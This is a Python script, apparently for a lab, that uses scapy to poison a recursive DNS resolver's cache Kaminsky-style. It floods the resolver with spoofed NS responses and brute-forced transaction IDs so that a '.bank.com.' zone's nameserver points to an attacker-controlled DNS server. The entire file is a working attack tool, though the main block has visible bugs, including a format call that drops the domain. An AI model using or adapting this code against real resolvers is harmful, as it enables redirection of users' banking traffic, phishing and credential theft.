import os
import random
from threading import Thread

from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sr1, sendpfast, Ether

# Vulnerable recursive DNS server settings
victim_dns_ip = "192.168.0.25"
victim_dns_port_in = int("53")
victim_dns_port_out = int("54")

# Target domain base to be messed with
victim_host_base = ".bank.com."

# Malicious DNS server
attacker_dns_ip = "192.168.0.26"

MAX_TTL = 60 * 60 * 24 * 7


def a_request(domain):
    return IP(dst=victim_dns_ip) / UDP(dport=victim_dns_port_in) / DNS(
        id=42,
        qr=0,
        opcode=0,
        rd=1,
        ra=0,
        qdcount=1,
        ancount=0,
        nscount=0,
        arcount=0,
        qd=DNSQR(qname=domain, qtype='A', qclass='IN'),
        an=0,
        ns=0,
        ar=0
    )


def forged_ns_response(id, target_domain, known_ns_domain, known_ns_ip):
    response = Ether() / IP(src=known_ns_ip, dst=victim_dns_ip, flags=2) / UDP(
        sport=53, dport=victim_dns_port_out) / DNS(
        id=id,  # Query ID / transaction id
        qr=1,  # QR (Query / Response) 1=response
        opcode=0,  # Set by client to 0 for a standard query, 0:"QUERY",1:"IQUERY",2:"STATUS"
        aa=1,  # Set to 1 in a server response if this dns_response is Authoritative, 0 if not.
        tc=0,
        # Set to 1 in a server response if the dns_response can't fit in the 512-byte limit of a UDP packet response
        rd=0,  # RD (Recursion Desired)
        ra=0,  # RA (Recursion Available), set by server: will (1) or won't (0) support recursion
        z=0,  # This is reserved and must be zero
        rcode=0,  # Response code from the server: indicates success or failure
        # 0:"ok", 1:"format-error", 2:"server-failure", 3:"name-error", 4:"not-implemented", 5:"refused"
        qdcount=1,  # Question record count
        ancount=1,  # Answer count
        nscount=1,  # authority count
        arcount=1,  # additional record count
        # AD and CD bits are defined in RFC 2535
        ad=0,  # # Authentic Data
        cd=0,  # Checking Disabled (0/1)
        # DNS Question Record
        qd=DNSQR(qname=target_domain, qtype='A', qclass='IN'),
        # DNS Resource Record
		an=DNSRR(rrname="12.34.56.78", type='A', rclass='IN', rdata=attacker_dns_ip, ttl=MAX_TTL),
        ns=DNSRR(rrname=target_domain, type='NS', rdata=known_ns_domain, ttl=MAX_TTL),
        ar=DNSRR(rrname=known_ns_domain, type='A', rdata=attacker_dns_ip, ttl=MAX_TTL)
    )
    return response


class Poison(Thread):
    def __init__(self, response_amount, known_ns_domain, known_ns_ip, offset):
        self.response_amount = response_amount
        self.known_ns_domain = known_ns_domain
        self.known_ns_ip = known_ns_ip
        self.running = True
        self.offset = offset
        super(Poison, self).__init__()

    def run(self):
        counter = 0
        id = random.randrange(2 ** 16)

        while self.running:
            target_domain = "www{}{}{}".format(counter, self.offset, victim_host_base)
            counter += 1

            packet_list = [Ether() / a_request(target_domain)]

            for i in range(self.response_amount):
                packet_list.append(
                    forged_ns_response(
                        (id + i) % (2 ** 16),
                        target_domain,
                        self.known_ns_domain,
                        self.known_ns_ip
                    )
                )
            id = (id + self.response_amount) % (2 ** 16)

            print("Sending packets from {} with id in interval [{:#x}, {:#x}] to {}"
                  .format(self.known_ns_ip, id, id + self.response_amount, victim_dns_ip))
            print("Chance of success: 1-(1-{:d}/65536)**{:d} = {:.2f}"
                  .format(self.response_amount, counter, 1 - pow((1 - self.response_amount / 65536.), counter)))

            sendpfast(packet_list, pps=100000, iface="eth1", verbose=0)

            ns_response = sr1(a_request(self.known_ns_domain), verbose=0)

            if ns_response[DNS].an.rdata == attacker_dns_ip:
                print("Successfully poisoned the zone of {}".format(victim_host_base))
                break
            else:
                print("Poisoning failed")

if __name__ == '__main__':
        known_ns_domain = "ns01.cashparking.com."
        known_ns_ip = "216.69.185.38"
#
#    known_ns_domain_2 = "ns02.cashparking.com."
#    known_ns_ip_2 = "208.109.255.38"
#
#    t1 = Poison(150, known_ns_domain, known_ns_ip, 'a')
#    t2 = Poison(150, known_ns_domain_2, known_ns_ip_2, 'b')
#    try:
#        t1.start()
#        t2.start()
#    except KeyboardInterrupt:
#        t1.running = False
#        t2.running = False
        target_domain = "www1234".format(victim_host_base)
        packet_list = [Ether() / a_request(target_domain)]
        for i in range(int("ffff", 16)):
                packet_list.append(
                    forged_ns_response(
                        i,
                        target_domain,
                        known_ns_domain,
                        known_ns_ip
                    )
                )
        sendpfast(packet_list, pps=100000, iface="eth1", verbose=0)
        ns_response = sr1(a_request(known_ns_domain), verbose=0)
